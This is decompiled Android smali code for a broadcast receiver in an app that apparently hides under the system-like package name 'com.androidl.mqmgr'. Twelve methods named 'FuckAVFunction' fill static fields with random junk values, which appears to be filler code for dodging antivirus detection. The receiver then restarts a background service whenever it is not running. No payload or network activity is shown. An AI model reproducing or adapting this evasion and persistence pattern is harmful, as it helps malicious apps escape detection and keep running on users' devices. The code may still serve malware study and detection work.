.class public Lcom/androidl/mqmgr/eoceew;
.super Landroid/content/BroadcastReceiver;
.source "eoceew.java"


# static fields
.field public static final ACTION:Ljava/lang/String; = "com.androidl.mqmgr.MainServiceStart"

.field private static p0:Ljava/lang/String;

.field private static p1:Ljava/lang/Boolean;

.field private static p10:Ljava/lang/Integer;

.field private static p11:Ljava/lang/Integer;

.field private static p12:Ljava/lang/Boolean;

.field private static p13:Ljava/lang/Boolean;

.field private static p14:Ljava/lang/Integer;

.field private static p15:Ljava/lang/Boolean;

.field private static p16:Ljava/lang/Boolean;

.field private static p2:Ljava/lang/String;

.field private static p3:Ljava/lang/String;

.field private static p4:Ljava/lang/Boolean;

.field private static p5:Ljava/lang/Integer;

.field private static p6:Ljava/lang/Boolean;

.field private static p7:Ljava/lang/Boolean;

.field private static p8:Ljava/lang/Boolean;

.field private static p9:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 7
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private static FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)V
    .locals 7
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/Boolean;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 32
    move-object v2, p2

    .line 33
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p2:Ljava/lang/String;

    .line 34
    move-object v1, p1

    .line 35
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p4:Ljava/lang/Boolean;

    .line 36
    move-object v5, p5

    .line 37
    .local v5, "s5":Ljava/lang/Boolean;
    sput-object v5, Lcom/androidl/mqmgr/eoceew;->p12:Ljava/lang/Boolean;

    .line 38
    move-object v0, p0

    .line 39
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p8:Ljava/lang/Boolean;

    .line 40
    move-object v4, p4

    .line 41
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p6:Ljava/lang/Boolean;

    .line 42
    move-object v3, p3

    .line 43
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p5:Ljava/lang/Integer;

    .line 44
    move-object v6, p6

    .line 45
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androidl/mqmgr/eoceew;->p13:Ljava/lang/Boolean;

    .line 47
    return-void
.end method

.method private static FuckAVFunction1(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/String;

    .prologue
    .line 49
    move-object v2, p2

    .line 50
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p7:Ljava/lang/Boolean;

    .line 51
    move-object v4, p4

    .line 52
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p9:Ljava/lang/String;

    .line 53
    move-object v0, p0

    .line 54
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p0:Ljava/lang/String;

    .line 55
    move-object v1, p1

    .line 56
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p8:Ljava/lang/Boolean;

    .line 57
    move-object v3, p3

    .line 58
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p10:Ljava/lang/Integer;

    .line 59
    return-object v4
.end method

.method private static FuckAVFunction10(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 4
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Boolean;

    .prologue
    .line 168
    move-object v3, p3

    .line 169
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p7:Ljava/lang/Boolean;

    .line 170
    move-object v2, p2

    .line 171
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p6:Ljava/lang/Boolean;

    .line 172
    move-object v0, p0

    .line 173
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p0:Ljava/lang/String;

    .line 174
    move-object v1, p1

    .line 175
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p16:Ljava/lang/Boolean;

    .line 176
    return-object v3
.end method

.method private static FuckAVFunction11(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 7
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/Boolean;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 179
    move-object v3, p3

    .line 180
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p11:Ljava/lang/Integer;

    .line 181
    move-object v1, p1

    .line 182
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p5:Ljava/lang/Integer;

    .line 183
    move-object v4, p4

    .line 184
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p12:Ljava/lang/Boolean;

    .line 185
    move-object v0, p0

    .line 186
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p1:Ljava/lang/Boolean;

    .line 187
    move-object v2, p2

    .line 188
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p4:Ljava/lang/Boolean;

    .line 189
    move-object v6, p6

    .line 190
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androidl/mqmgr/eoceew;->p8:Ljava/lang/Boolean;

    .line 191
    move-object v5, p5

    .line 192
    .local v5, "s5":Ljava/lang/Boolean;
    sput-object v5, Lcom/androidl/mqmgr/eoceew;->p15:Ljava/lang/Boolean;

    .line 193
    return-object v6
.end method

.method private static FuckAVFunction2(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;)V
    .locals 3
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Boolean;

    .prologue
    .line 62
    move-object v0, p0

    .line 63
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p0:Ljava/lang/String;

    .line 64
    move-object v2, p2

    .line 65
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p6:Ljava/lang/Boolean;

    .line 66
    move-object v1, p1

    .line 67
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p14:Ljava/lang/Integer;

    .line 69
    return-void
.end method

.method private static FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 5
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Integer;

    .prologue
    .line 71
    move-object v4, p4

    .line 72
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p14:Ljava/lang/Integer;

    .line 73
    move-object v3, p3

    .line 74
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p10:Ljava/lang/Integer;

    .line 75
    move-object v1, p1

    .line 76
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p7:Ljava/lang/Boolean;

    .line 77
    move-object v2, p2

    .line 78
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p0:Ljava/lang/String;

    .line 79
    move-object v0, p0

    .line 80
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p5:Ljava/lang/Integer;

    .line 81
    return-object v4
.end method

.method private static FuckAVFunction4(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;)V
    .locals 5
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Boolean;

    .prologue
    .line 84
    move-object v3, p3

    .line 85
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p11:Ljava/lang/Integer;

    .line 86
    move-object v2, p2

    .line 87
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p4:Ljava/lang/Boolean;

    .line 88
    move-object v4, p4

    .line 89
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p6:Ljava/lang/Boolean;

    .line 90
    move-object v1, p1

    .line 91
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p7:Ljava/lang/Boolean;

    .line 92
    move-object v0, p0

    .line 93
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p5:Ljava/lang/Integer;

    .line 95
    return-void
.end method

.method private static FuckAVFunction5(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/String;

    .prologue
    .line 97
    move-object v1, p1

    .line 98
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p12:Ljava/lang/Boolean;

    .line 99
    move-object v5, p5

    .line 100
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androidl/mqmgr/eoceew;->p9:Ljava/lang/String;

    .line 101
    move-object v3, p3

    .line 102
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p0:Ljava/lang/String;

    .line 103
    move-object v4, p4

    .line 104
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p3:Ljava/lang/String;

    .line 105
    move-object v0, p0

    .line 106
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p2:Ljava/lang/String;

    .line 107
    move-object v2, p2

    .line 108
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p5:Ljava/lang/Integer;

    .line 109
    return-object v5
.end method

.method private static FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 7
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 112
    move-object v5, p5

    .line 113
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androidl/mqmgr/eoceew;->p2:Ljava/lang/String;

    .line 114
    move-object v4, p4

    .line 115
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p3:Ljava/lang/String;

    .line 116
    move-object v2, p2

    .line 117
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p11:Ljava/lang/Integer;

    .line 118
    move-object v6, p6

    .line 119
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androidl/mqmgr/eoceew;->p12:Ljava/lang/Boolean;

    .line 120
    move-object v3, p3

    .line 121
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p6:Ljava/lang/Boolean;

    .line 122
    move-object v1, p1

    .line 123
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p9:Ljava/lang/String;

    .line 124
    move-object v0, p0

    .line 125
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p16:Ljava/lang/Boolean;

    .line 126
    return-object v6
.end method

.method private static FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 5
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Boolean;

    .prologue
    .line 129
    move-object v1, p1

    .line 130
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p15:Ljava/lang/Boolean;

    .line 131
    move-object v2, p2

    .line 132
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p4:Ljava/lang/Boolean;

    .line 133
    move-object v3, p3

    .line 134
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p0:Ljava/lang/String;

    .line 135
    move-object v4, p4

    .line 136
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p1:Ljava/lang/Boolean;

    .line 137
    move-object v0, p0

    .line 138
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p8:Ljava/lang/Boolean;

    .line 139
    return-object v4
.end method

.method private static FuckAVFunction8(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/String;

    .prologue
    .line 142
    move-object v3, p3

    .line 143
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p10:Ljava/lang/Integer;

    .line 144
    move-object v0, p0

    .line 145
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p1:Ljava/lang/Boolean;

    .line 146
    move-object v2, p2

    .line 147
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p7:Ljava/lang/Boolean;

    .line 148
    move-object v4, p4

    .line 149
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p3:Ljava/lang/String;

    .line 150
    move-object v1, p1

    .line 151
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p2:Ljava/lang/String;

    .line 152
    return-object v4
.end method

.method private static FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)V
    .locals 5
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Boolean;

    .prologue
    .line 155
    move-object v4, p4

    .line 156
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/eoceew;->p1:Ljava/lang/Boolean;

    .line 157
    move-object v1, p1

    .line 158
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/eoceew;->p11:Ljava/lang/Integer;

    .line 159
    move-object v0, p0

    .line 160
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/eoceew;->p6:Ljava/lang/Boolean;

    .line 161
    move-object v2, p2

    .line 162
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/eoceew;->p12:Ljava/lang/Boolean;

    .line 163
    move-object v3, p3

    .line 164
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androidl/mqmgr/eoceew;->p9:Ljava/lang/String;

    .line 166
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 198
    const-string v0, "CvjChK"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction10(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 199
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const-string v3, "icuwmsFam"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 200
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "jnIfQS"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x1da837e1

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "HmiPNH"

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction8(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 201
    const-string v0, "phjhrvA"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2b31a28b

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "VaiRcee"

    const-string v4, "hdhGbf"

    const-string v5, "BmmwRJc"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 202
    sget-boolean v0, Lcom/androidl/mqmgr/DLaoRacV;->isRunning:Z

    if-nez v0, :cond_0

    .line 203
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const-string v3, "kuBBkwe"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 204
    const v0, 0x8bf7ecc

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x594c980

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction4(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 205
    const-string v0, "UrrIrtUOS"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x1f973616

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "rdQfn"

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 206
    new-instance v7, Landroid/content/Intent;

    const-string v0, "com.androidl.mqmgr.MainServiceStart"

    invoke-direct {v7, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 207
    .local v7, "i":Landroid/content/Intent;
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "PViqqq"

    const v3, 0x468e77c

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)V

    .line 208
    const-class v0, Lcom/androidl/mqmgr/DLaoRacV;

    invoke-virtual {v7, p1, v0}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 209
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x1699efab

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const-string v3, "sTPBum"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 210
    const-string v0, "ewuwmNq"

    const v1, 0xa3747bc

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 211
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const-string v3, "DaNicgV"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 212
    invoke-virtual {p1, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 213
    const-string v0, "eTqJsmqo"

    const v1, 0x157d6b85

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 214
    const v0, 0x2cbd716d

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "GnIpfMlQ"

    const v3, 0x191f5618

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const v4, 0x179a8355

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 215
    const v0, 0x2f1b4329

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x2264c9c4

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/eoceew;->FuckAVFunction4(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 217
    .end local v7    # "i":Landroid/content/Intent;
    :cond_0
    return-void
.end method
